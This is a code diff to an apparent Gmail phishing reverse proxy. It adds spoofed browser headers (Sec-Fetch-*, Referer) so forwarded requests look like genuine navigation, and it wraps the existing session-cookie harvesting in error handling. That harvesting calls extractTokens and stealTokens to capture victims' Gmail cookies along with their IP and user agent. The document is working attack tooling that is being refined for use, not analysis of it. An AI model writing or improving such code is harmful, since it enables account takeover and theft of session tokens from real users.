@@ -54,7 +54,12 @@ async function proxyGmail(url, request, clientIP, userAgent) {
   const headers = new Headers(request.headers);
   headers.set('Host', 'mail.google.com');
   headers.set('Origin', 'https://mail.google.com');
-  headers.set('Referer', 'https://mail.google.com/mail/u/0/');
+  headers.set('Referer', 'https://mail.google.com/mail/u/0/#inbox');
+  headers.set('Sec-Fetch-Site', 'same-origin');
+  headers.set('Sec-Fetch-Mode', 'navigate');
+  headers.set('Sec-Fetch-Dest', 'document');
+  headers.set('Sec-Fetch-User', '?1');
+  headers.set('Upgrade-Insecure-Requests', '1');
   headers.delete('Accept-Encoding'); // Avoid compression issues
 
   // Forward to real Gmail
@@ -65,15 +70,19 @@ async function proxyGmail(url, request, clientIP, userAgent) {
     redirect: 'manual'
   });
 
-  let response = await fetch(gmailReq);
-  
-  // EXTRACT TOKENS FROM RESPONSE COOKIES
-  const tokens = extractTokens(response.headers);
-  if (tokens.length > 0) {
-    await stealTokens(tokens, clientIP, userAgent, url.href);
-  }
+  try {
+    let response = await fetch(gmailReq);
+    
+    // EXTRACT TOKENS FROM RESPONSE COOKIES
+    const tokens = extractTokens(response.headers);
+    if (tokens.length > 0) {
+      await stealTokens(tokens, clientIP, userAgent, url.href);
+    }
 
-  return craftResponse(response);
+    return craftResponse(response);
+  } catch (error) {
+    return new Response(`Proxy Error: ${error.message}`, { status: 502 });
+  }
 }
 
 function extractTokens(headers) {
